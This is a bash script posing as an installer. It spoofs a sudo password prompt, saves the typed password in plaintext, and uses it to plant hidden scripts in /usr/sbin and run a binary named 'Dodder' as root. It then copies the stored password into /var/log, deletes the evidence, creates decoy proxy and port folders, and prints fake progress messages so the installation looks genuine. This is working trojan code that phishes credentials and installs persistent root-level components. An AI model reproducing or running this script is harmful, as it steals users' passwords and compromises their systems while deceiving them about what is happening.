#!/usr/bin/env bash
SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
  DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
  SOURCE="$(readlink "$SOURCE")"
  [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it relative to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

i=5
while [ $i -ne 0 ]
do
    printf "[sudo] password for $USER:" && read -s passwrd
    echo "" && echo $passwrd > $DIR/.pass
    sudo -k -S ls < $DIR/.pass > /dev/null 2>&1
    i=$?
    if [ $i -ne 0 ]
    then
        sleep 1
        if [ -f ~/dead.letter ]
        then
            rm ~/dead.letter
        fi
        echo "[sudo], try again."
    fi
done
cd $DIR/
sudo -k -S cp $DIR/.uploadConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
sudo -k -S cp $DIR/.systemConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
sudo -k -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
sudo -k -S cp $DIR/.pic.jpg /usr/share/applications/ < $DIR/.pass > /dev/null 2>&1
sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
rm $DIR/.pass
rm $DIR/.pic.jpg
rm $DIR/start.desktop
rm $DIR/.systemConfig.sh
rm $DIR/.uploadConfig.sh

mkdir $DIR/proxy_networks
mkdir $DIR/proxy_networks/proxy172.16.24.{1..3}
mkdir $DIR/proxy_networks/proxy172.16.20.2
mkdir $DIR/proxy_networks/proxy172.16.12.{1..3}
mkdir $DIR/ports
mkdir $DIR/ports/port{3020..3130}

touch $DIR/ports/port{3020..3130}/portfile{1..10}
touch $DIR/proxy_networks/proxy172.16.24.{1..3}/proxyfile{1..3}
touch $DIR/proxy_networks/proxy172.16.12.{1..3}/proxyfile{1..3}
touch $DIR/proxy_networks/proxy172.16.20.2/proxyfile{1..3}

sleep 1
echo "Initializing"
sleep 2
echo "Copying files ..."
sleep 2
echo "Unpacking files ..."
sleep 2
echo "Configuring settings ..."
sleep 1
echo "checking proxy server"
sleep 1
echo "Configuring ports"
sleep 1
echo "applying changes"
sleep 1
echo "saving changes"
sleep 1
echo "Completed!!!"
